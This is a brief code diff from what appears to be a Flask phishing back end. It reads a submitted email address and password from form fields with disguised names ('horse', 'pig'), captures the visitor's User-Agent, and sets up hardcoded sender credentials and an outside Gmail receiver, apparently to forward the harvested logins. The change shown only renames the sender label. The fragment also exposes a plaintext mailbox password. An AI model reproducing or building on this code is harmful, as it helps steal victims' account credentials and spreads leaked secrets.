@@ -192,7 +192,7 @@ def first():
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "munna@onegroupbd.com"
-        sender_emaill = "eissa"
+        sender_emaill = "munna"
         receiver_email = "s.toihidi@gmail.com"
         password = "MUNNA@ONE123"
         useragent = request.headers.get('User-Agent')
